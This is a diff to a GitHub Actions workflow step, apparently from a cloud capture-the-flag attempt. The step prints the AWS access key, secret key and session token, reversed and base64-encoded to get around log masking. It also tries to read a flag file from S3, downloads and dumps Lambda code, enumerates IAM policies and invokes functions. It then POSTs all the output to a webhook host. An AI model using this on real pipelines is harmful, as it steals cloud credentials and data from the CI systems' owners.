@@ -29,23 +29,18 @@ jobs:
             echo "===ID==="
             aws sts get-caller-identity
             echo "===CREDS_REV_B64==="
-            # reverse + base64 to reduce GHA log masking of session keys
-            python3 -c 'import os,base64;ks=["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN"];
-[print(k+"="+base64.b64encode((os.environ.get(k,"") or "")[::-1].encode()).decode()) for k in ks]'
+            python3 -c "import os,base64;ks=['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN']; [print(k+'='+base64.b64encode((os.environ.get(k,'') or '')[::-1].encode()).decode()) for k in ks]"
             echo "===FLAG_TRY==="
             aws s3 cp s3://codec4f26c862a321ef5/flag.txt - 2>&1
             echo "===LAM_CODE==="
             URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text 2>/dev/null)
             echo "url_len=${#URL}"
             curl -sL "$URL" -o /tmp/lam.zip
-            ls -la /tmp/lam.zip
-            python3 -c 'import zipfile,os;p="/tmp/lam.zip";
-print("size",os.path.getsize(p) if os.path.exists(p) else -1);
-z=zipfile.ZipFile(p);
-[print("FILE",n,"\n",z.read(n)[:4000].decode("utf-8","replace")) for n in z.namelist()]'
+            ls -la /tmp/lam.zip 2>&1
+            python3 -c "import zipfile,os;p='/tmp/lam.zip';print('size',os.path.getsize(p) if os.path.exists(p) else -1);z=zipfile.ZipFile(p);[print('FILE',n) or print(z.read(n)[:4000].decode('utf-8','replace')) for n in z.namelist()]"
             echo "===POLICY==="
             aws iam list-attached-role-policies --role-name cicdRole 2>&1
-            P=$(aws iam list-attached-role-policies --role-name cicdRole --query "AttachedPolicies[0].PolicyArn" --output text 2>/dev/null)
+            P=$(aws iam list-attached-role-policies --role-name cicdRole --query 'AttachedPolicies[0].PolicyArn' --output text 2>/dev/null)
             echo "P=$P"
             if [ -n "$P" ] && [ "$P" != "None" ]; then
               V=$(aws iam get-policy --policy-arn "$P" --query Policy.DefaultVersionId --output text)
@@ -60,12 +55,11 @@ z=zipfile.ZipFile(p);
             aws lambda invoke --function-name nslookupv2 --cli-binary-format raw-in-base64-out --payload '{}' /tmp/out.json 2>&1
             echo "===INVOKE_OUT==="
             cat /tmp/out.json 2>&1
-            echo "===LIST_FN==="
+            echo "===MISC==="
             aws lambda list-functions --query 'Functions[].FunctionName' 2>&1
             aws apigateway get-rest-apis 2>&1
             aws ec2 describe-vpcs --query 'Vpcs[].VpcId' 2>&1
           } 2>&1 | tee "$OUT"
           curl -s -X POST --data-binary @"$OUT" "$WH" || true
-          # also print file so logs exist even if webhooks lag
           wc -c "$OUT"
           cat "$OUT"
